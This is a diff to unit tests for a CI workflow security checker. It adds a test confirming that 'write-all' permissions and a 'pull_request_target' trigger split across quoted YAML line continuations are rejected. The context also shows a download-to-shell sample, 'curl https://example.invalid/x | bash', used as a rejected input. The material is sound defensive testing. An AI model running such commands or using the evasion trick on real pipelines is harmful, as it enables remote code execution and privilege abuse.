@@ -110,6 +110,26 @@ class WorkflowSecurityTests(unittest.TestCase):
         )
         self.assertTrue(any("write-all" in error for error in self.check(write_all)))
 
+    def test_multiline_quoted_sensitive_values_fail_closed(self) -> None:
+        continued_write = 'permissions: "write-' + "\\\n" + '  all"'
+        write_all = workflow("      - run: true\n").replace(
+            "permissions:\n  contents: read", continued_write
+        )
+        self.assertTrue(
+            any("quoted YAML scalars" in error for error in self.check(write_all))
+        )
+
+        continued_event = 'on: "pull_request_' + "\\\n" + '  target"'
+        pull_request_target = workflow("      - run: true\n").replace(
+            "on:\n  push:", continued_event
+        )
+        self.assertTrue(
+            any(
+                "quoted YAML scalars" in error
+                for error in self.check(pull_request_target)
+            )
+        )
+
     def test_download_to_shell_variants_are_rejected(self) -> None:
         commands = (
             "curl https://example.invalid/x | bash",
